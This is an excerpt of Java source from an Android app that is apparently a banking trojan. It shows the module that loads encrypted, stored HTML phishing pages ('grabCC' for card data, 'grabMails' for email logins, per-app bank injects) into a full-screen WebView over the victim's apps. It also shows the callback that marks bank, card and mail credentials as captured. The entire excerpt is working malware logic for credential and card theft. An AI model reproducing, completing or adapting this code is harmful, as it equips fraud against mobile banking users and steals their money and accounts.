        ...
        if((!stopActivity) && (open.equals("new"))) {
            ...
            try {
                if (getIntent().getStringExtra("push").equals("1")) {
                    String startpush  = utl.SettingsRead(this, "startpush");
                    if(!startpush.isEmpty()){
                        mApplication = startpush;
                        nameInj = utl.SettingsRead(this, "nameInject");
                        utl.SettingsWrite(this, "startpush", "");
                    }
                }
            }catch (Exception ex){}
            ...
            try {
                if (!mApplication.isEmpty()) {
                    ...
                    if ((nameInj.equals("grabCC")) || (nameInj.equals("grabMails"))) {
                        getHTML = utl.trafDeCr(utl.SettingsRead(this, nameInj));

                        getHTML = getHTML.replace("var lang = 'en'", "var lang = '" + lang + "'");
                        getHTML = getHTML.replace("app = 'APPNAME'", "app = '" + mApplication + "'");
                    } else {
                        getHTML = utl.trafDeCr(utl.SettingsRead(this, mApplication));
                    }

                    if(nameInj.equals("grabCC")){
                        getHTML = getHTML.replace("PGh0bWwgbGFuZz0iZW4iPg==", "PGh0bWwgbGFuZz0i" + Locale.getDefault().getLanguage() + "Ij4=");
                    }

                    utl.SettingsToAdd(this, consts.LogSMS , "Inject:" + mApplication  + "::endLog::");
                    wv.loadDataWithBaseURL(null,getHTML, "text/html", "UTF-8", null);
                    setContentView(wv);
                }
                utl.Log(TAG_LOG, "Start View Injection: " + mApplication);
            } catch (Exception ex) {
                utl.Log(TAG_LOG, "ERROR View Injection: " + mApplication);
            }
        }
    }
        ...
        public void returnResult(String data) {
            if(!data.isEmpty()) {
                ...
                if(nameInj.equals(consts.str_null)){
                    utl.SettingsWrite(mContext, consts.statBanks, "1");
                    settingsApp = mApplication;
                }else if(nameInj.equals("grabCC")){
                    utl.SettingsWrite(mContext, consts.statCards, "1");
                    settingsApp = nameInj;
                }else if(nameInj.equals("grabMails")){
                    utl.SettingsWrite(mContext, consts.statMails, "1");
                    settingsApp = nameInj;
                }
